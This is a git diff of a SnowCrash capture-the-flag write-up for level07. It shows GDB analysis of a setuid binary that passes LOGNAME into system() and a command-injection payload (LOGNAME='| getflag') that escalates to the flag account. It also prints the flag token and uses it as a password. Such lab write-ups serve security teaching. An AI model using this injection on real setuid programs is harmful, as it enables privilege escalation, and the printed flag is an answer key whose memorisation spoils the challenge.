@@ -1,19 +1,35 @@
 # level07
 
-- We log as `level07`
+- We login as user level07.
+```
+level07@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
 
-- A single file is located inside the home directory of level07:
->`-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07`
+level07@SnowCrash:~$ ./level07
+level07
 
-- The executable file has setuid & setgid bits permissions
+level07@SnowCrash:~$ ./level07 abc
+level07
+```
 
-- We can see that the executable will be executed as `flag07` if we execute it being `level07`
 
-- Upon execution without arguments the executable prints:
->`level07`
+- A binary has been left for us. Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
+```
+level07@SnowCrash:~$ gdb ./level07
+...
+(gdb) info functions
+All defined functions:
 
-- We dissassemble it using gdb, here is the asm dump of the main function:
-```asm
+File /home/user/level07/level07.c:
+int main(int, char **, char **);
+
+Non-debugging symbols:
+0x08048384  _init
+...
+```
+```
+(gdb) disas main
 Dump of assembler code for function main:
    0x08048514 <+0>:     push   %ebp
    0x08048515 <+1>:     mov    %esp,%ebp
@@ -41,7 +57,6 @@ Dump of assembler code for function main:
    0x0804856f <+91>:    movl   $0x8048680,(%esp)
    0x08048576 <+98>:    call   0x8048400 <getenv@plt>
    0x0804857b <+103>:   mov    %eax,0x8(%esp)
----Type <return> to continue, or q <return> to quit---
    0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)
    0x08048587 <+115>:   lea    0x14(%esp),%eax
    0x0804858b <+119>:   mov    %eax,(%esp)
@@ -49,50 +64,34 @@ Dump of assembler code for function main:
    0x08048593 <+127>:   mov    0x14(%esp),%eax
    0x08048597 <+131>:   mov    %eax,(%esp)
    0x0804859a <+134>:   call   0x8048410 <system@plt>
-   0x0804859f <+139>:   leave  
-   0x080485a0 <+140>:   ret    
+   0x0804859f <+139>:   leave
+   0x080485a0 <+140>:   ret
 End of assembler dump.
 ```
 
-- We can see multiple system calls: `getenv`, `asprintf`, `system`
->`0x08048576 <+98>:    call   0x8048400 <getenv@plt>`
->`0x0804858e <+122>:   call   0x8048440 <asprintf@plt>`
->`0x0804859a <+134>:   call   0x8048410 <system@plt>`
 
-- Knowing that the file has setuid bit set the `system` call is interesting, knowing how it works could permit us to execute arbitrary code
-
-- We add a breakpoint at `0x08048576` and display `$0x8048680` which is the element moved as first parameter of `getenv`
->`0x0804856f <+91>:    movl   $0x8048680,(%esp)`
->`(gdb) x/s 0x8048680`
->`0x8048680:       "LOGNAME"`
-
-- We can this the return value of `getenv` is moved at `0x08` which is the third parameter of `asprintf`
->`0x0804857b <+103>:   mov    %eax,0x8(%esp`
-
-- We can this the value of `0x8048688` is moved at `0x04` which is the second parameter of `asprintf`, let's display it:
->`0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)`
->`(gdb) x/s 0x8048688`
->`0x8048688:       "/bin/echo %s "`
-
-- We can see `0x14(%esp)` is moved as first parameter of asprintf, it is a pointer which will be allocated by `asprintf` and this pointer is passed as first parameter of `system`
-```asm
-   0x08048587 <+115>:   lea    0x14(%esp),%eax
-   0x0804858b <+119>:   mov    %eax,(%esp)
-   0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
-   0x08048593 <+127>:   mov    0x14(%esp),%eax
-   0x08048597 <+131>:   mov    %eax,(%esp)
-   0x0804859a <+134>:   call   0x8048410 <system@plt>
+- The program calls `<getenv@plt>` after pushing the address (`0x8048680`) onto the stack, which points to the value of the parameter of this function.
+```
+(gdb) x/s 0x8048680
+0x8048680:       "LOGNAME"
 ```
 
-- We can conclude that this binary gets the content of the `LOGNAME` environment variable and pass it through echo.
 
-- We can corrupt the `LOGNAME` variable and make arbitrary code execution:
-```bash
-export LOGNAME="| getflag >/tmp/pwn07"
-./level07
+- `<getenv@plt>` will thus save the value of the `LOGNAME` environment variable in the `eax` register, and this value will be passed as a parameter to the `<asprintf@plt>` function. Note that the address `0x8048688` is also pushed onto the stack to be used by `<asprintf@plt>`.
+```
+(gdb) x/s 0x8048688
+0x8048688:       "/bin/echo %s"
 ```
 
-- We can `cat /tmp/pwn07`:
->`Check flag.Here is your token : fiumuikeil55xe9cu4dood66h`
 
-- We get the flag: `fiumuikeil55xe9cu4dood66h`
+- Then, `<asprintf@plt>` will store in the `eax` register the address pointing to the beginning of the string `/bin/echo %s`, where `%s` will be replaced by the contents of the `LOGNAME` environment variable.
+The resulting string will be executed by calling `<system@plt>`, so:
+```
+level07@SnowCrash:~$ export LOGNAME="| getflag"
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+level07@SnowCrash:~$ su level08
+Password:fiumuikeil55xe9cu4dood66h
+level08@SnowCrash:~$
+```
